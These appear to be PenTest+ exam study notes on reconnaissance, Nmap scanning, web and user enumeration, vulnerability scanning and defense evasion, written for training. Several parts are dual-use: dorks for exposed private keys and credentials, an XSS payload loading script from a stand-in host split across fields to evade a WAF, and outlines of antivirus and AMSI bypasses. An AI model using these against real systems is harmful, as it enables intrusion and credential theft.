- There are 3 different footprint levels to choose from, ranging from **L1 (basic), L2 (mid), L3 (intense),** and **XXL (large targets).**
- Each level takes into consideration time, which transforms are executed, and the amount of information collected. The higher the level, the more data you will ultimately accumulate.
- **Process:**
  - Click the Maltego icon in the top left, and select New to start a new graph or CTRL+T.
  - Click on Machines in the top menu to get the Machines toolbar to appear. Select Run Machine to choose an existing machine.
  - Choose Footprint level.
  - Enter a domain name to use for online investigation and click Finish.
- The **Entity Palette** describes each type of graphical icon and what it represents. Maltego allows you to toggle between layouts (how entities are represented) or if you want to list entities in the list view or graph view.
- The lines from one entity to the next illustrates **entity relationships.** Hovering over an entity will show the relationship definition and information sources listed in the Detailed View window.
- This can be used to draw conclusions about the network configuration, such as subdomain information, IP address assignments, etc.
- Right click an entity on the graph to configure and run any number of applicable transforms to extend the search criteria and build upon established relationships.
- Maltego allows the user to visualize hidden relationships and define attack paths that fall in line with the scope of the engagement by showing clustering of entities.

### FOCA

- **Fingerprinting Organizations with Collected Archives** is a Microsoft Windows-based tool used to automate the discovery process for metadata analysis. [https://github.com/ElevenPaths/FOCA](https://github.com/ElevenPaths/FOCA)
- FOCA uses the Google, Bing, and DuckDuckGo search engines to find and analyze common document types, such as Microsoft Office, Open Office, and Adobe PDF.

### Search Engines

- **Dorks** are queries that you can use to find data about your target. Some search engines, such as Google, allow advanced query parameters to find information that a normal query might bury under thousands of results.
- GitHub dorking, Google dorking, Censys and Shodan

###


### GitHub

- Public source code repository.
- Pentesters may be able to find private keys, authentication data, hard-coded passwords, system configuration data, and even code vulnerabilities that could be useful during an engagement.
- [https://github.com/obheda12/GitDorker/blob/master/Dorks/alldorksv3](https://github.com/obheda12/GitDorker/blob/master/Dorks/alldorksv3)
- Possible to find references to other software that is in use that allows you to identify internal technologies, like database versions, or even vulnerable dependencies that you might exploit during a test.
- Github Dorks:
  - **extension:pem private:** Search for private keys
  - **extension:ppk private:** Search for puTTY private keys
  - **filename:id\_rsa** or **filename:id\_dsa:** Search for ssh private keys
  - **filename:passwd path:etc:** May find UNIX credentials and encrypted passwords

### Google Dorks

- **Exploit Database** hosts the **Google Hacking Database**([https://www.exploit-db.com/google-hacking-database](https://www.exploit-db.com/google-hacking-database)), which is filled with dorks that work in Google.
- Limit the results of searches by adding the **site:** or **inurl:** search components.
- **ext: log site: \<your-domain-name.com\>** or **ext: log inurl: \<your-domain-name.com\>**
- Google dorks:
  - **inurl: login.htm intitle:"\*login":** Find login portals
  - **ext:log:** Find log files exposed to the Internet
  - " **Private" + "Confidential" ext:pdf | ext:docx | ext:doct | ext:doc | ext:xls | ext:xlst | ext:xlsx:** Find confidential or private Office documents and PDFs
  - **intitle:"index of":** Find directory indexing
  - " **cpanel username" "cpanel password" ext:txt:** Cpanel credentials

- Additional operators:
  - allintitle:
  - allinurl:
  - allintext:
  - intext:
  - cache:
  - related:
  - filetype:
- Can also use logical operators and wildcards. (AND / OR, \*)

### Censys

- Created in 2015 at the University of Michigan by the same security researchers who created ZMap.
- Lets you query host and certificate information from Internet-wide scans using full text searches or field-based searches with regex (in the commercial version) and logic operators for enriching your queries.
- Can search either by host information or by certificate information.
- For hosts, Censys collects information about network addressing, vendor, operating system or software names, services, geographical location information, and information about technology used in web pages, among others.
- For certificates, it collects details such as cipher data, subject and issuer data, and validity of publicly visible certificates.
- [https://support.censys.io/hc/en-us/articles/360059608451-Censys-Search-Language](https://support.censys.io/hc/en-us/articles/360059608451-Censys-Search-Language)

### Shodan

- Search engine that also scanned the entire Internet, parsing banners for services and categorizing the data returned by each device.
- The main page provides a search box that can be used to examine content to find keywords or phrases.
- Advanced queries enable users to apply filters and boolean logic operators to drill down into the results.
- [https://www.shodan.io/](https://www.shodan.io/)

### Web Archives

- Most popular is probably **The Wayback Machine,** but some search engines, like Google, also offer the ability to pull up an older cached version of a site that shows up in search results.
- Useful for examining whether a website was accidentally published online or information was published unintentionally on a website.

## Active Reconnaissance

- Actively engaging the target in order to do things like detect open ports, web pages, services, and identify exploitable weaknesses you can use during the pentest.
- These actions may show up in logs, monitoring systems, or affect bandwidth utilization of the target.
- Use this method carefully during a pentest unless you are not concerned about being detected, causing a disruption, or triggering incident response.
- Taking these actions outside of your contract may be prohibited or discouraged by local or regional laws.

### Host Enumeration

- One of the most famous open-source network security scanning tools known to pentesters is the **Network Mapper (Nmap).**
- Nmap is a command-line tool that utilizes various network protocols and advanced features for surveying hosts for open TCP and UDP ports, fingerprinting operating systems, extracting service banners, and much more.
- **Enumeration** is the process of establishing active connections to target systems in order to find potential attack vectors.
- This includes attempting to find hosts, services, domains, URLs, and valid users to attack.
- **Host discovery** is an active scanning technique used to aid in the process of information gathering.
- The goal is to identify hosts alive and listening on the network.
- Common Nmap flags that are generally used to conduct information gathering exercises about hosts:
  - **-sL:** Lists the targets to scan and does a reverse-DNS lookup
  - **-sn:** Pings scan, disables port scan
  - **-Pn:** Disables ping, treats all hosts online, skips host discovery
  - **-PS/PA/PU/PY [portlist]:** TCP SYN/ACK, UDP, or SCTP discovery to given ports
  - **-n:** No DNS resolution
  - **-v/ -vv:** Increases verbosity level of scan output
  - **-oN/ -oX/ -oG \<file\>:** Outputs scan in normal, XML, and grepable formats
  - **-oA \<basename\>:** Outputs into the three major formats at once.

_ **Exam tip:** _ _Nmap is an important tool for the pentester and will be covered in the exam. Make sure you understand its various uses, options, and scan output. The various Nmap flags and options covered are listed on the PenTest+ exam objectives. For a full list of command options, execute_ _ **nmap -h.** _

### Ping Scan

- An Nmap ping scan (-sn or -sP flag) is a simple method of determining if a host is alive on the network.
- Whenever possible, Nmap will use an ARP scan.
- Can specific **–send-ip** to force a ping scan to use the Internet Control Message Protocol (ICMP) instead.
- A ping scan will send a type 8 message (ECHO request) to the target host. If a host is alive, it will respond to the source of the request with a type 0 message (ECHO reply)
- Control messages from ICMP common use
  - **ICMP Reply Message 0 - Echo Reply:**
    - **Code 0:** Reply used for ping
  - **ICMP Reply Message 3 - Destination unreachable:**
    - **Code 0:** Network unreachable
    - **Code 1:** Host unreachable
    - **Code 2:** Protocol unreachable
    - **Code 3:** Port unreachable
    - **Code 5:** Source route failed
    - **Code 6:** Destination Network unknown
    - **Code 7:** Destination Host unknown
    - **Code 9:** Network administratively prohibited
    - **Code 10:** Host administratively prohibited
- **grep** is useful to search for patterns from the scan output and dump the results to STDOUT. We can also pipe the returned output from the grep command into **awk** and print only the fields that are relevant from our search criteria.

### Address Resolution Protocol (ARP) Scan

- On local subnets, machines are addressed by MAC addresses instead of IP addresses.
  - To determine the correct destination MAC address for a packet, ARP checks a local cache of known IP address and MAC address pairings, and if it doesn't exist, it tries to resolve it.
  - To resolve it, a packet is sent out to the broadcast address (FF:FF:FF:FF:FF:FF) on the network.
  - The host that owns that iIP sends a directed ARP reply back to the requestor with the correct mapping.
  - The requester adds it to their cache to remember it for a fixed period of time. Until it expires, the host doesn't have to re-resolve that pairing on the network.
- As a pentester, you can use this to discover other hosts on a network.
- From the system console, you can issue the **arp -a** command to get a list of IP addresses and MAC addresses that the system has communicated with.
- From the network, you could send out ARP requests using a tool like **arp-scan** in Linux.

_ **Tip:** _ _Nping (_[_https://nmap.org_](https://nmap.org/)_) is another tool that is available in Kali that provides advanced options for using ICMP, ARP, and other protocols to probe hosts over the network._

### Service Identification and Fingerprinting

- Service enumeration attempts to connect to a listening service, or listen for traffic from that service.
- Service scanning asks a series of questions to elicit a response from a host over the network.
- The way that a service responds, including timing, protocol implementation, and banners, may tell more about the version of software and the device behind the service.

### Port Scanning Methods

- Port scanning is used to evaluate the state of a port.
  - A port can be open, closed, or filtered (possibly blocked by a firewall).
  - **Connection-oriented scans** use the TCP protocol and evaluate the state of TCP-based ports and services and are the most reliable.
  - **UDP scans** follow a less advantageous pattern of success, as they offer little to no reliability as the wither a port is available over the network.
  - UDP ports respond with an **ICMP type 3 "port unreachable"** message.
  - Nmap will infer that the port is either open or filtered in the event it does not receive a message from the target host.
- During a pentest engagement, time is of the essence.
  - Adding **scan overhead**, like version detection (-sV), will likely increase the amount of time to complete a scan.
  - Nmap provides timing and performance options to help improve scan efficiency. These options enable a user to specify the number of probes sent to a target or to reference timeout parameters, which by default are measured in seconds.
  - A more straightforward approach would be to use the **timing template (-T\<0-5\>)** and allow Nmap to determine the timing values.
  - The **paranoid (0)** and **sneaky (1)** templates are used to evade IDS and firewalls, while the **polite (2)** template is used to conserve bandwidth and resource utilization on the target machines. Templates **aggressive (4)** and **insane (5)** are used for speed, not accuracy.
  - The **normal (3)** template is the default template when scanning with Nmap.
  - Any other performance-based options will take precedence over the template that was selected.
- Nmap command options:
  - **-sT/ -sS/ -sU:** TCP scan (full connect scan)/SYN scan (half-open scan)/ UDP scan
  - **-p:** Specify unique ports (comma separated) or port range
  - **-sV:** Service/version detection
  - **-O:** Operating system fingerprinting
  - **-iL:** Target input file (list IP addresses or hosts in sequential order)
  - **--script/ -sC:** Specify Nmap script to use with scan
  - **-T\<0-5\>:** Set timing template (higher is faster)
  - **--max-retries \<tries\>:** Specify amount of port scan probe retransmissions
  - **--host-timeout \<time\>:** Give up on scanning target after this long (default time value is measured in seconds)

_ **Tip:** _ _Services listening on UDP ports do not typically send a response to acknowledge that the port is open, but on occasion, they do send a response, which helps validate that the port is open. However, if nothing is returned, Nmap will show the port as open | filtered. It is possible that the port may be open, or possibly packet filters applied at a firewall are blocking the communication. Regardless, the version detection option (-sV) can be applied to the command syntax to help ascertain open ports from closed ports._

### Common Ports and Protocols

- Pentesters should familiarize themselves with common **system, registered,** and **dynamic ports.**
- System ports are any port between 0 and 1023. These ports require root- or system-level privileges within the operating system platforms.
- Registered ports between 1024 and 49151 are user-level ports that host application services that do not require elevated privileges to run.
- Dynamic ports are any ports higher than 49151 and are in the private allocation range; they are not typically found in the user range.
- Common ports and protocols:
  - FTP port 20/21 (TCP)
  - SSH port 22 (TCP)
  - TELNET port 23 (TCP)
  - SMTP port 25 (TCP)
  - DNS port 53 (TCP/UDP)
  - DHCP port 67 (UDP)
  - TFTP port 69 (UDP)
  - HTTP port 80 (TCP)
  - NTP port 123 (UDP)
  - RPC port 135 (TCP)
  - NetBIOS port 137-139 (TCP/UDP)
  - SNMP port 161/162 (UDP)
  - LDAP port 389 (TCP/UDP)
  - HTTPS port 443 (TCP)
  - SMB port 445 (TCP)
  - VMware Server port 902 (TCP)
  - MSSQL port 1433 (TCP)
  - NFS port 2049 (TCP/UDP)
  - MySQL port 3306 (TCP)
  - RDP port 3389 (TCP)

_ **Caution:** _ _Leaving unused ports and services open and available to untrusted hosts over the network is poor network security hygiene. Encouraging customers to follow the principle of least privilege can go a long way to reducing overall network security risk to an organization. Most mitigations found in a pentest report can likely be mitigated by disabling or applying better access control to a network resource._

### TCP Scan

- TCP (RFC 793 - Transmission Control Protocol) is connection oriented and offers reliable data exchange between two network hosts.
- This type of scan is referred to as a full connect scan and uses an operating system's network function to perform the TCP three-way handshake with a target host.
- The TCP scan is the default scan method when using Nmap if no other scan option is specified.
- It is the most reliable scan type; however, it provides low-level control and may take more time to complete on larger networks, which makes it very inefficient.
- When a scan is executed without service detected but with the --reason or -vv flags, Nmap provides the reason as to why it listed a port as open, closed, or filtered.
- However, we know a SYN-ACK response from a target will typically mean that the port is available over the network.

### Half-Open Scan

- The TCP SYN scan is the most popular scan method, as it provides fast and effective scanning of thousands of hosts simultaneously.
- Never completes the three-way handshake.
- The SYN scan provides full control over the packets it generates and allows the user to control timeout response times to speed up the performance of the scan.
- The user must have root or administrator privileges in order to execute a SYN scan.

_ **Note:** _ _A SYN flood (half-open attack) is a form of denial of service attack where a malicious user will send a series of SYN requests to a target to make the service unresponsive to legitimate traffic._

### UDP Scan

- Connectionless and can be very unreliable.
- UDP services are commonly deployed to support services that require the need for distributing information to hosts within a broadcast domain.
- Common services such as DNS, DHCP, and NetBIOS rely on broadcast messages, as the intended recipient of the message may not be known.
- A pentester should target UDP ports that are common within an organizational network first, and later after enumerating further information from the network, possibly target additional UDP ports of interest.
- In most cases, if a port is found to be open, Nmap will display a default service identifier if a banner was not attained through service version detection (-sV flag).
- Nmap has over 2,200 known services listed in the nmap-services database, which is included with the installation of Nmap and periodically updated as new services can be fingerprinted.
- The Nmap Scripting Engine (NSE) is an extended framework for Nmap written in Lua to help automate a variety of networking tasks, including the ability to write scripts to tinker with and finagle network services.
- Certain scripts have the ability to perform specific tasks, such as extract version information and if a service is configured to allow anonymous login.
- Each NSE script provides a head, rule, and action.
- The head provides metadata information, such as argument information, description, and dependencies for execution.
- The rule is a Lua method that determines if an action should be executed or not, and the action is the functionality of the script.
- Most NSEs that are deemed safe for execution can be included with a typical scan, using the -sC flag.
- If you wanted to perform a DNS cache snooping scan against an organization's internal DNS server to uncover possible social networking sites, you would have to invoke the script specifically from the command line.

_ **Tip:** _ _You can find more information about the Lua language and NSE at_ [_https://nmap.org_](https://nmap.org/)_. Creating your own NSE is fairly straightforward, and the Script Writing Tutorial page on the Nmap website can get you started._

### Web Target Identification

- The most basic way to identify a web server is to look at the Server field in the HTTP response header. Netcat, which is undoubtedly one of the most useful and underrated tools available, can be used to open a TCP connection to a remote host.
- Netcat can also be used to open up a TCP connection with a database server, such as MySQL, in order to extract banner information from the corresponding service.

### Web Content Enumeration

- Crawling (or spidering)
  - The process of ingesting a web page and following all of the links from that web page, and then crawling the links front hat page, and so on.
  - Doing this manually is called browsing.
  - Crawling is a more automated approach.
  - Two tools that do this are CeWL and Burp Suite.
  - Helps find forms, login interfaces, and other testable content.
  - Burp Suite will attempt to automatically evaluate the content for possible vulnerabilities and highlight those items for manual inspection.
  - Scaping looks at the contents of a known web page. Its objective is to fetch the web page and gather terms and information from the site for analysis.
  - This can be used to attempt to automatically identify web pages based on common terms, or you can feed a selection of scraped terms into a dictionary and use them to attempt to brute-force more pages, sites, or files.
- Brute-Forcing
  - Using a dictionary or wordlist populated with common names found in most web technologies to enumerate information.
  - DirBuster:
    - Java-based framework
    - Integrated into Burp Suite via plugins
    - Included in Kali Linux
    - Kali provides a common wordlist found in /usr/share/dirbuster/wordlists.

### Manual Inspection

- Scanners are limited in their ability to understand context and interpret responses.
- txt file
  - Found at the top level directory of a host.
  - Used to restrict web indexing capabilities for web crawlers like google and Bing.
  - Web crawlers look for this file first for instruction before traversing through a website.
  - This provides a list of possible uniform resource identifiers (URIs) that could help discover hidden directory and file listings.
- Site map files (sitemap.xml) and cross-domain files (cross-domain.xml) are two other examples of information disclosures found on sites with a large number of dynamic pages that provide site information, hyperlinks, and metadata.

### Analyzing Errors

- Web servers, web applications, and databases produce error codes and stack traces when they receive a request that cannot be processed.
- Web servers have five status code families with many different individual status codes that fire off, depending on how the request was received or processed by the server.
- HTTP Status Code Families
  - 1xx: Information responses
    - 100 - Continue
    - 101 - Switching Protocols
    - 102 - Processing
  - 2xx: Success
    - 200 - OK
    - 201 - Created
    - 202 - Accepted
  - 3xx: Redirection
    - 301 - Moved Permanently
    - 302 - Found
    - 304 - Not Modified
    - 307 - Temporary Redirect
    - 308 - Permanent Redirect
  - 4xx: Client errors
    - 400 - Bad Request
    - 401 - Unauthorized
    - 403 - Forbidden
    - 404 - Not Found
    - 405 - Method Not Allowed
    - 408 - Request Timeout
  - 5xx: Server errors
    - 500 - Internal Server Error
    - 501 - Not Implemented
    - 503 - Service Unavailable
- Database errors follow the same mentality, if it can't respond to a user's request, it will produce an error for interpretation.
- SQL databases such as Oracle, MySQL, and Microsoft SQL (MSSQL) have common errors that can stimulate the curiosity of a pentester to investigate possible SQL injection flaws.
- MySQL errors start with a four-digit error number followed by a "-" and the error description.
- MSSQL errors contain the error number, severity, error message string, line number, procedure name, and state, which can provide the location in source code that is throwing the error.
- Oracle errors contain a prefix with the error code (i.e., ORA-0001), followed by a description of the problem.
- Most security scanning tools have options to throttle the scan performance to alleviate the burden on affected network segments.
- APIs are used within software applications to receive requests and send responses.
- Software developers can impose rate limiting against certain API methods to help improve application performance and reduce the likelihood of denial of service (DoS) attacks.
- A vulnerability scanner that enables authenticated scanning is best served for those remote services that require authentication.
- The Three Basic Types of APIs
  - Local APIs: The original API, created to provide operating system or middleware services to application programs.
  - Web APIs: Designed to represent widely used resources like HTML pages and are accessed using a simple HTTP protocol. Often called REST APIs or RESTful APIs.
  - Program APIs: Based on RPC technology that makes a remote program component appear to be local to the rest of the software.

### User Enumeration

- You might target login interfaces that you identify with a user enumeration attack.
- The idea is to see whether the response you get back from a login attempt is different when you use a valid user versus an invalid one.
- A web application might respond with a different web page, a service might take longer to respond for an invalid login, or a system might show a different response code or screen.
- OWASP documents this attack method for web applications, but this also applies to other exposed login and authentication interfaces, especially in the cloud.
- You can use cloud-provider endpoints to attempt to enumerate valid users or to confirm the existence of users identified in OSINT searches using these URLs:
  - Microsoft Online: [https://login.microsoftonline.com/getuserrealm.srf?login=username@companyname.com&xml=1](https://login.microsoftonline.com/getuserrealm.srf?login=username@companyname.com&xml=1)
  - Microsoft O365: [https://outlook.office365.com/autodiscover/autodiscover.json/v1.0/username@companyname.com?Protocol=Autodiscoverv1](https://outlook.office365.com/autodiscover/autodiscover.json/v1.0/username@companyname.com?Protocol=Autodiscoverv1)
  - To use these endpoints, change "username@companyname.com" with the value you are attempting to investigate.
- Nmap has several user enumeration scripts for different protocols, most denoted by "enum."
  - krb5-enum-users attempts to discover valid Kerberos users by brute-forcing usernames against a Kerberos service.
- There are also Nmap .nse scripts for enumerating users in drupal, oracle, SIP, SMB, and SMTP.
- For share and file enumeration, Nmap offers guessing of tftp shares, for configuration files of network devices, for example.
  - tftp-enum
- May also attempt to enumerate mainframe transaction IDs with the Nmap cics-enum script, or Citrix applications with the citrix-enum-apps script.
- For shares, smb-enum-shares will work for servers with SMB enabled.
- There are other tools that will check exposed services for users. Metasploit has modules such as auxiliary/admin/mssql/mssql\_enum\_sql\_logins that will enumerate logins from exposed services.

## Defense Detection and Detection Avoidance

### Detection

- These controls are not always reliably detectable through automated means, but some things to look for are differences in HTTP headers across requests (their ordering or content), differences in HTTP response codes across requests, unexpected HTTP headers, cookies that indicate a defensive control, or differences in the timestamp from time drift between systems.
- lbd (included with Kali) checks several of these characteristics to attempt to detect load balancers, but these methods aren't guaranteed to be reliable.
- Tenable's Nessus, a vulnerability scanner, also offers plugin ID 1224 to attempt to detect load balancers based on some of these characteristics.
- Web application firewalls (WAFs) are designed to intercept web requests and block common attack patterns.
- In practice, WAFs can be difficult to detect because it is sometimes hard to differentiate WAF blocks from proper application validation.
- Tools like Wafalyzer and wafw00f can attempt to identify a WAF by sending requests and looking at headers, cookie values, and error messages. If the systems have not been heavily customized, then these tools will make identification easier. If they have, then the rules will likely not match and you will have to manually determine if a WAF is at play.
- The easiest way to do this is to pick some obviously malicious strings and put them into a URL using fields that won't have any application logic behind them.
- Watch the traffic using a proxy tool, such as Burp Suite or ZAP to see if headers, redirectors, or other information is sent but not visible to the end user.
- Firewalls are typically easier to identify. Some firewalls drop traffic that isn't allowed, in which case if you send a message, you won't get a success or ICMP message back.
- If the firewall is returning ICMP messages and you have one good port for a host and one bad port, you can look at the TTL on the packet to determine the differences.
- nmap.org

### Evasion

- bypasses for network-based controls are heavily dependent on both the control's tuning and the platform running it.
- Round-robin-based load balancing takes the requests and sends them to a pool of systems, one at a time, in round-robin fashion. Depending on how this is implemented, users aren't guaranteed to end up on the same system each time. This means you'll either need to compromise one and then make many requests until you are once more routed to the exploited system.
- With persistent load balancing, the device frequently generates and stores some form of session variable and uses that to determine the target system for a given session. While this guarantees session consistency, this can be abused.
- Exploits can be used to compromise the load balancer and then change the configurations to benefit the attacker.
  - One such attack that has been publicly abused is the Big-IP RCE that takes advantage of an exposed management interface and then lets the attacker gain RCE and either tunnel through the device or take it over.
- WAF bypasses are heavily dependent on the software being used, but WAFs are frequently minimally configured in order to save time and not prevent legitimate attacks, so typical attack patterns such as \<script src=[http://maliciousurl/mal.js](http://maliciousurl/mal.js)\> would be blocked, but less common methods of injection may not.
- A common technique is to split the attack across variables.
  - If there is a first name and a last name field, make the first name \<script and the last name src=[http://maliciousurl/mal.js](http://maliciousurl/mal.js)\>. When the application puts them together, it may still interpret the attack, while the WAF misses it.
- Other techniques are to use unicode encoding values or to use less common abuse tags like \<img\>, which may also work.
- For SQL injection vulnerabilities, SQL has various constructs that can be abused. You may be successful with SQL attacks by using techniques such as using encoded values, adding random comments, splitting values, or others.
- Firewall bypasses have two predominant varieties: exploit based bypasses and filter bypasses.
  - Exploits typically involve sending specially crafted packets to a firewall that will cause the firewall to crash in a specific way that will let an attacker execute commands.
  - Bypasses take advantage of misconfigurations or features of the firewalls that are designed to make them more friendly to users.
    - For misconfigurations, security administrators frequently design controls for how protocols are supposed to work.
    - In a three-way handshake, a client sends a SYN request to the server, and the server sends back a SYN-ACK, and the client finishes with an ACK and data.
    - To stop new connections on certain ports, teh administrator may block SYN packets, but if the attacker starts off with an ACK packet, it would be allowed through because the rules would assume that a connection must already exist.
    - Protocol helpers help open ports for specific types of multiport protocols and are another bypass target.

_ **Exam Tip:** _ _There are some great cheat sheets about these styles of attack. Studying these will help to identify them in exam questions._ [_https://owasp.org/www-community/xss-filter-evasion-cheatsheet_](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)

### Antivirus

- AV bypasses are constantly evolving. Attackers come up with new techniques, AV vendors evolve products.
- Most AV vendors are still signature-based, which means they rely on a file fingerprint or a specific pattern match for detection.
- Being able to avoid AV detection is fundamental for post-exploitation.
- One of the most common attack tools is Metasploit.
  - Using msfvenom, an attacker can generate payloads and create executables.
  - However, the code is injected into a template, and that template is easily detected by most AV vendors.
  - By using a different template, you have the ability to get past many of the AV scans.
  - [https://www.blackhillsinfosec.com/advanced-msfvenom-payload-generation/](https://www.blackhillsinfosec.com/advanced-msfvenom-payload-generation/)
- Attackers are moving to C# for their exploits because it is more flexible for using PowerShell or direct system calls, for example, and they are easier to customize than C language-based exploits.
  - C# uses assemblies instead of compiled code.
  - This makes it easier for AV vendors to disassemble exploits and get the original code in order to perform string matches and conduct additional analysis.
  - An easy way to evade string matching is to change the ProjectGuid, attribution artifacts, and then run ConfuserEx on the file to randomize names and variables.
- Combing shellcode and C# is another option. Using C3 the attacker can create an application that will inject shellcode into other processes or execute it directly.
  - Data can be encoded or otherwise modified such that signature-based detections no longer match the exploit constructs.
  - [https://posts.specterops.io/offensive-p-invoke-leveraging-the-win32-api-from-managed-code-7eef4fdef16d](https://posts.specterops.io/offensive-p-invoke-leveraging-the-win32-api-from-managed-code-7eef4fdef16d)
- PowerShell is another good way to bypass AV.
  - Most AV products use Antimalware Scan Interface (AMSI) to detect malicious code in PowerShell.
  - There are many well-known AMSI bypasses in PowerShell.
  - Along with Script-Block Logging bypasses, this can mean that code can be executed in memory without additional security.
  - Getting the data into PowerShell can happen via HTTPS, encoded or encrypted files, or whatever novel technique that you come up with.

### Vulnerability Scanning and Analysis

- Vulnerability scanning is the process of inspecting an information system for known security weaknesses.
- This process provides results with no validation.
- Vulnerability analysis (or vulnerability assessment) is a methodical approach used to validate the existence of the vulnerability.
- Scanning will determine if there is something interesting that should be investigated, and analysis is the investigation and research process to validate that a vulnerability can be exploited.
- MITRE and the National Institute for Standards and Technology (NIST) are two organizations that conduct vulnerability research and publish their findings to the public.
- Tenable Nessus is a remote vulnerability scanning tool that helps automate these processes and is one of the most popular commercial products on the market.
- Nessus provides a web-based user interface that enables users to execute either credentialed or non credentialed scans, which are governed by Nessus policies.
- The Nessus policy defines the appropriate Nessus plugins and configuration values that are required to execute a successful scan. Nessus plugins are developed in Tenable's proprietary scripting language called the Nessus Attack Scripting Language (NASL). Each plugin contains vulnerability information, remediation details, and the logic to determine the presence of a security weakness. Plugins are identified with a unique plugin ID and are categorized into plugin families
- **CAUTION** Vulnerability scanning is not necessarily "no exploitation." Some tools (like Tenable Nessus) provide plugins that connect to services and send actual exploits.It is important to understand the tool's capabilities while discussing scoping and the technical limitations as part of client relationship management, contracts, and reporting.

### Credentialed vs. Non Credentialed Scanning

- Remote vulnerability scanners are known to produce a fair share of false positives. Executing null session scans against targets is sometimes a best guess, depending on the scanner and its ability to properly fingerprint a service and reliably map the service version to a known vulnerability. However, non credentialed scans show what the attack surface looks like to an untrusted user. Organizations could analyze the results and prioritize where to focus their initial defense tactics. Authenticated scans, or credentialed scanning, helps to reduce the number of false positives reported by a vulnerability scanner, but there are good reasons other than lessening inaccuracy to run credentialed scans
- Nessus scan policies allow users to specify credentials to use during the scan. A variety of credential categories can be configured within the policy to include cloud services, databases, and host-based, like SSH
- Nessus also supports credentials for protocols that use plaintext authentication, like HTTP, FTP, and Telnet.

### Vulnerability Scan Analysis

Vulnerability scanners such as Nessus provide an easy-to-use interface for identifying and researching vulnerabilities produced from a scan. Reports can be exported into multiple formats such as HTML, PDF, CSV, or XML (Nessus).

Vulnerabilities represent the specific NASL output that was generated from the scan. If the host was found to be vulnerable, the appropriate vendor-established severity level of Critical, High, Medium, Low, or Info (informational) is applied. Tenable, the company behind Nessus, maintains a YouTube channel with videos containing examples of common Nessus functions and output [https://www.tenable.com/nessus/resource-center](https://www.tenable.com/nessus/resource-center)

NOTE Tenable Nessus and other vulnerability scanners do not consider environmental factors such as architectural deployment, mitigating controls, and data protections that may make the impact more or less serious in the eyes of the organization.

Plugin output will also provide additional sources of information for the vulnerability, such as risk information, vulnerability information, reference information, and if there is a known public exploit for the vulnerability, typically referenced with a Metasploit module. Nessus incorporates the CVSS scoring system from NVD when producing the risk information output. This helps with vulnerability mapping, prioritizing weaknesses, and identifying potential exploits for each host. A base and temporal score are provided along with an overall risk factor. The plugin output and the exploit details can help weigh in on the overall impact of the vulnerability. The severity level for a reported vulnerability can be modified in Nessus during the analysis process. It is up to the pentester to determine the true impact, given various environmental factors.

EXAM TIP There are many commercial vulnerability scanning products on the market with comparable features to Tenable Nessus, like Rapid7 Nexpose, e-Digital Retina, and QualysGuard. An open-source vulnerability scanner that was forked from Nessus a while back is called OpenVAS. Like Nessus, it uses open-source plugins, developed in NASL, to automate vulnerability scanning. However, you will not need to know all of these tools or their capabilities for the exam, but having a foundational knowledge of how they work will go a long way.

### Compliance and Configuration Auditing

Maintaining standards within an organization is important, as it implies confidence in achieving distinct levels of performance against an acceptable behavior or outcome. Technology standards are enforceable and should reflect organizational policy. In Chapter 1 we learned about different types of compliance-based assessments. PCI DSS, HIPAA, and FISMA are important standards that certain organizations are required to follow. Many tools are available to evaluate a technology's ability to meet those standards, based on their configuration. Tenable Nessus allows pentesters to audit various configurations using preconfigured scan templates for operating systems, cloud infrastructure, mobile device managers, and much more. Operating baselines help organizations with asset categorization and implementing industry best practices. The Center for Internet Security (CIS) (https://cisecurity.org) provides best-practice security configuration baselines that can be used to apply configuration guidance to safeguard operating systems, software, and networks.

The CIS benchmarks are free as long as you are not a consultant or using them for consulting. The technical evaluation criteria from each benchmark have already been implemented into various Security Content Automation Protocol (SCAP)–aware scanning tools, such as Tenable Nessus. SCAP is a method for using specific standards for the automated discovery and measurement of vulnerabilities and policy compliance evaluation. Tenable Nessus allows users to define custom compliance scans that include preconfigured or custom-developed audit files, which are XML-based text files that define the policy standard being evaluated. Compliance scans require credentials, as they perform local checks against the operating system. The CIS compliance checks are one of many ways to evaluate the configuration compliance of a technical asset. Baselines help define a happy medium and tolerance to organizational policy, since not all technologies can be locked down as much as one would like. Practicing good security hygiene is a common theme that starts with observing best practices and how they can be implemented within the organization. Compliance auditing helps enforce organizational configuration policies and offers guidance on how an asset should be configured.

NOTE SCAP is a U.S. standard maintained by NIST. There are a number of tools that provide automated compliance and vulnerability scanning. NIST maintains a list of SCAP-validated scanning tools on their website (https://csrc.nist.gov). OpenSCAP (https://www.open-scap.org) is an open-source project that provides a wide variety of configuration baselines and hardening guidance for Linux-based operating systems.

### Vulnerability Research Sources

MITRE is a not-for-profit organization that provides access to public community resources for conducting vulnerability research and analysis such as Common Vulnerabilities and Exposures (CVE) (https://cve.mitre.org); Common Weakness Enumeration (CWE) (https://cwe.mitre.org); the Common Attack Pattern Enumeration and Classification (CAPEC) (https://capec.mitre.org); and the Adversarial Tactics, Techniques and Common Knowledge (ATT&CK) matrix (https://attack.mitre.org). These resources are sponsored by outside organizations such as the United States Computer Emergency Readiness Team (US-CERT) and the U.S. Department of Homeland Security (DHS), who are responsible for responding to major incidents and threats and for sharing cyber-security information and knowledge around the world.

### CVE

CVE defines vulnerabilities as "a weakness in computational logic found in software and hardware components that, when exploited, results in a negative impact to confidentiality, integrity, or availability." CVE provides a list of identifiers for publicly disclosed vulnerabilities. Each CVE is maintained by the CVE Numbering Authority (CNA) and includes the following details:

• CVE ID (i.e., "CVE-2018-0001")

• Brief description of the vulnerability

• References or advisories

EXAM TIP There are other threat intelligence, incident management, and cyber-security information sharing organizations around the globe similar to DHS and US-CERT, such as the Japan Computer Emergency Response Team (JPCERT) (https://www.jpcert.or.jp) and the CERT Coordination Center, which is run by Carnegie Mellon University. Security researchers who do not wish to release a vulnerability to the vendor directly or through a bug bounty program may do so through the CERT Vulnerability Reporting Form (https://kb.cert.org/vuls/report/).

The CVE Dictionary is the de facto standard for documenting publicly disclosed vulnerabilities. NIST maintains the National Vulnerability Database (NVD) (https://nvd.nist.gov), which performs analysis on the vulnerabilities that have been published to the CVE Dictionary, using the Common Vulnerability Scoring System (CVSS). The results of the analysis provide metrics that can be used by an organization to determine the overall impact of a vulnerability to the environment, if exploited. The CVE website provides a search feature that will allow you to search through the CVE List for CVE entries. Figure 2-38 shows example search results when investigating a specific CVE. This is great when the vulnerability is known. However, for software vulnerabilities that are not public knowledge or are identified during the early stages of the design phase, the CWE can be used as an alternative source for research and reference.

Figure 2-38 Search CVE List

